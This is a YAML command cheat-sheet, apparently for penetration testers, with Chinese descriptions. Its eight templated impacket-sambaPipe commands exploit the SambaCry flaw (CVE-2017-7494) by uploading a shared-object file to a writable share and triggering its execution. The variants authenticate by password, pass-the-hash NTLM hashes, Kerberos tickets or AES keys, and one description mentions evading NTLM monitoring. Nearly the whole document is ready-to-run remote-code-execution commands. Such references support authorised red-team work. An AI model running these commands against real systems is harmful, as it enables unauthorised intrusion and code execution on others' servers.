tool: impacket-sambapipe
tags: [network, pentest, exploitation, smb, samba, cve-2017-7494, remote-code-execution]

actions:
  # === BASIC EXPLOITATION ===
  - title: impacket-sambaPipe - 使用密码进行基本利用
    desc: |
      此命令发起对 SambaCry 漏洞（CVE-2017-7494）的利用。
      它将指定的共享对象（.so）文件上传到目标服务器上的可写共享并触发其执行。
      当你拥有对至少一个共享具有写权限的用户的明文凭据时，这是最常见的用法。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} {{domain|.}}/{{username}}:{{password}}@{{target}}"

  - title: impacket-sambaPipe - 使用 NTLM 哈希进行利用
    desc: |
      使用传递哈希身份验证而非明文密码执行漏洞利用。
      当你从内存或数据库提取到 NTLM 哈希但无法破解时，这很有用。
      哈希应以 LMHASH:NTHASH 格式提供；如果只有 NT 哈希，可将 LM 部分留空。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} -hashes {{hash}} {{domain|.}}/{{username}}@{{target}}"

  # === ADVANCED AUTHENTICATION ===
  - title: impacket-sambaPipe - Kerberos 身份验证
    desc: |
      在 Active Directory 环境中使用 Kerberos 票据进行身份验证来执行漏洞利用。
      此命令要求存在有效的 Kerberos 缓存文件（ccache），并由 KRB5CCNAME 环境变量指向。
      它通常用于绕过针对 NTLM 的监控，或在目标上禁用 NTLM 身份验证时使用。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} -k -no-pass {{domain}}/{{username}}@{{target}}"

  - title: impacket-sambaPipe - 使用 AES 密钥的 Kerberos
    desc: |
      使用特定的 Kerberos AES 密钥（128 或 256 位）进行身份验证。
      当你拦截或提取到特定帐户的 AES 密钥时，此方法很有用。
      它无需原始明文密码或预生成的 ccache 文件即可进行 Kerberos 身份验证。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} -aesKey {{hex_key}} {{domain}}/{{username}}@{{target}}"

  # === CONNECTION & TROUBLESHOOTING ===
  - title: impacket-sambaPipe - 自定义目标 IP 和端口
    desc: |
      手动指定 SMB 连接的目标 IP 地址和目的端口。
      当目标的 NetBIOS 名称无法解析，或 Samba 服务运行在非标准端口时使用。
      当通过复杂网段或隧道路由时，显式定义 target-ip 也很有帮助。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} -target-ip {{ip_address}} -port {{port|445}} {{domain|.}}/{{username}}:{{password}}@{{target_name}}"

  - title: impacket-sambaPipe - 指定域控制器
    desc: |
      指定用于身份验证的域控制器 IP 地址。
      在多宿主环境中，或当域名的 DNS 解析失败时，这一点尤为重要。
      提供 DC-IP 可确保身份验证请求直接发送到正确的身份提供方。
    command: "impacket-sambaPipe -so {{so_file|exploit.so}} -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}@{{target}}"

  - title: impacket-sambaPipe - 详细调试输出
    desc: |
      启用调试模式，提供有关 SMB 握手和利用序列的极其详细的信息。
      这对于排查利用失败或连接重置至关重要。
      输出将显示尝试的具体管道名称以及服务器对模块加载请求的响应。
    command: "impacket-sambaPipe -debug -so {{so_file|exploit.so}} {{domain|.}}/{{username}}:{{password}}@{{target}}"

  - title: impacket-sambaPipe - 带时间戳日志的利用
    desc: |
      在利用过程中为日志输出的每一行添加时间戳。
      这对于文档记录以及将利用尝试与红队评估期间的服务器端日志相关联很有用。
      它有助于准确跟踪 .so 文件上传的时间以及触发命令发送的时间。
    command: "impacket-sambaPipe -ts -so {{so_file|exploit.so}} {{domain|.}}/{{username}}:{{password}}@{{target}}"
